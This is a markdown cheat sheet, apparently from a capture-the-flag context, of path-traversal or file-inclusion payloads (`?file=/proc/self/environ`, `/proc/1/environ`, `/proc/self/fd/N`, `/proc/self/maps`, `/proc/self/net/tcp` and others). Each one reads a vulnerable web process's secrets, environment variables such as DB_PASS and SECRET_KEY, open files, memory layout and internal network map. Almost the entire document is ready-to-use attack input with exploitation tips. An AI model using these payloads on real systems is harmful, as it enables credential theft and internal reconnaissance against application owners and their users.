# `/proc` Filesystem — the process's self-view

## Why `/proc` — the process reads itself

`/proc` is Linux's process filesystem — every process's runtime state
is a file — the parser/app/worker process exposes its own args, env,
fds, and network through `/proc/self/`.

## `/proc/self/cmdline` — the launch command

```
?file=/proc/self/cmdline
```

NUL-separated args — `php-fpm\0--fpm-config\0/etc/php/fpm.conf\0` —
reveals the interpreter, the config path, the working dir. Clean it:
`tr '\000' ' '`.

## `/proc/self/environ` — the env vars

```
?file=/proc/self/environ
```

NUL-separated `KEY=value\0` — `FLAG`, `DB_PASS`, `SECRET_KEY`, `PATH`,
`HOME`, `PWD`, `HOSTNAME`, `DOCUMENT_ROOT` — the env-leak.

## `/proc/self/cwd` — the working dir

```
?file=/proc/self/cwd              — a symlink to the cwd — reading it follows
?file=/proc/self/cwd/../config    — relative to the cwd
?file=/proc/self/cwd/../../flag   — traversal via the symlink
```

`cwd` is a symlink to the process's working directory — the
"read-relative-to-the-app" trick.

## `/proc/self/exe` — the binary

```
?file=/proc/self/exe
```

A symlink to the running binary — `/usr/sbin/php-fpm`/`/usr/bin/python3`/
`/usr/bin/node` — the interpreter identity.

## `/proc/self/status` — the identity

```
?file=/proc/self/status
```

```
Name:   php-fpm
State:  S (sleeping)
Tgid:   1234
Pid:    1234
PPid:   1
Uid:    33      33      33      33       — www-data
Gid:    33      33      33      33
```

`Uid:0` = root — the read-privilege oracle — `/etc/shadow`/`/root/flag`
reachable.

## `/proc/self/fd/N` — the open-file read

```
?file=/proc/self/fd/0              — stdin
?file=/proc/self/fd/1              — stdout
?file=/proc/self/fd/2              — stderr
?file=/proc/self/fd/3              — the app's open fds
?file=/proc/self/fd/4
?file=/proc/self/fd/5
...
?file=/proc/self/fd/20
```

fds 3+ = the app's open files — a deleted-but-open file, an open log,
an open flag file — the "read a file the app already opened" trick.
A socket-fd hangs — avoid.

## `/proc/self/maps` — the memory map

```
?file=/proc/self/maps
```

Mapped libs + ASLR base — the `.so`/`.dll` inventory + the memory-layout
oracle — for a pwn-adjacent chain.

## `/proc/self/mountinfo`/`mounts` — the mount table

```
?file=/proc/self/mountinfo
?file=/proc/self/mounts
```

Every mount — which host-paths are bind-mounted into a container — the
"the flag is mounted" discovery — `/flag` shows up as a mount.

## `/proc/self/net/*` — the network map

```
?file=/proc/self/net/tcp           — listening+established TCP (hex)
?file=/proc/self/net/tcp6
?file=/proc/self/net/udp
?file=/proc/self/net/udp6
?file=/proc/self/net/unix          — unix sockets
?file=/proc/self/net/arp           — ARP table — neighbors
?file=/proc/self/net/route         — routing table
?file=/proc/self/net/if_inet6
```

`net/tcp` — `local_address`/`rem_address` hex — `0A`=LISTEN — the
internal-services map — an SSRF-target discovery.

## `/proc/1/*` — PID 1 — the container's init

```
?file=/proc/1/cmdline              — the entrypoint
?file=/proc/1/environ              — PID1's env — container-injected FLAG
?file=/proc/1/cwd
?file=/proc/1/exe
```

PID1 = the container's init — `docker run -e FLAG=...` lands in
`/proc/1/environ` — the container-flag read.

## `/proc/<pid>/*` — other processes

```
?file=/proc/1234/cmdline
?file=/proc/1234/environ
?file=/proc/1234/cwd
?file=/proc/1234/fd/5
```

Any PID — try PID 1, the parent's PID, common service PIDs — a service
with different perms may hold files your process can't.

## `/proc/sys/*` — the kernel knobs

```
?file=/proc/sys/kernel/hostname
?file=/proc/sys/kernel/osrelease
?file=/proc/sys/kernel/ostype
?file=/proc/sys/net/ipv4/ip_forward
?file=/proc/sys/kernel/random/boot_id
```

Kernel info — hostname, kernel-version, ASLR/net settings.

## `/proc/version`/`cpuinfo`/`meminfo`/`uptime`/`loadavg`

```
?file=/proc/version                — kernel version
?file=/proc/cpuinfo                — CPU
?file=/proc/meminfo                — RAM
?file=/proc/uptime
?file=/proc/loadavg
```

## `/proc/sys/fs/*` — the filesystem knobs

```
?file=/proc/sys/fs/binfmt_misc/...  — binfmt handlers
?file=/proc/sys/fs/file-max
```

## `/proc/net/*` vs `/proc/self/net/*` — the namespace view

`/proc/net/` is the namespace's view — `/proc/self/net/` the process's —
same on most containers.

## `/sys/*` — the hardware/sysfs

```
?file=/sys/class/net/eth0/address   — MAC
?file=/sys/fs/cgroup/...            — cgroup — container fingerprint
?file=/sys/class/dmi/id/...
?file=/sys/kernel/mm/...
?file=/sys/devices/...
```

`sys/fs/cgroup` — the cgroup reveals container vs bare-metal.

## The "the proc-path needs NUL-cleaning" — the `tr` step

`/proc/self/environ`/`cmdline` are NUL-separated — the response may
render as one line — `tr '\000' ' '` splits them.
